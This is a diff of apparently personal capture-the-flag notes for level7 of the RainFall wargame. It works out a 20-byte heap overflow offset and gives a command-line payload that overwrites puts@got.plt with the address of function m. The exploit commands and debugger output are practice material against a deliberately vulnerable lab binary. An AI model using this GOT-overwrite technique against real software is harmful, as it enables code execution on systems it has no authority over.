@@ -200,25 +200,26 @@ $1 = {<text variable, no debug info>} 0x80484f4 <m>
   fgets( <unfinished ...>
   --- SIGSEGV (Segmentation fault) ---
   +++ killed by SIGSEGV +++
-  p (0x0804a028 + 4) - 0x0804a018
-  20
 #+end_src
-## the overflow offset is 20 bytes. address to put 08049928 -> tx little endian -> 28 99 04 08
 *** Data Required
 #+begin_src shel
+#              End - Start offset
+p (0x0804a028 + 4) - 0x0804a018
+20
+offset = 20B
 m = 0x080484f4
 puts@got.plt = 08049928
 #+end_src
 *** Exploit Strategy
 payload first argument will be "a" * 20 + \x28\x99\04\08 -> puts@got.plt
-payload second argument will be m va
+payload second argument will be m va for overwrite got.plt to the va of m.
 #+begin_src shell
 level7@RainFall:~$ ltrace ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') 
 strcpy(0x0804a018, "aaaaaaaaaaaaaaaaaaaa(\231\004\b") = 0x0804a018
 strcpy(0x08049928, NULL <unfinished ...> # The adderss is fine.
 #+end_src
 Verified the puts@got.plt is in b[1]
-because the open fail cause not change suid when ltrace, gdb ... couldn't test further with debuggers.
+the open fail cause not change suid when ltrace, gdb ... couldn't test further with debuggers.
 * Exploit
 #+begin_src shell
 level7@RainFall:~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"')  $(printf '\xf4\x84\x04\x08')
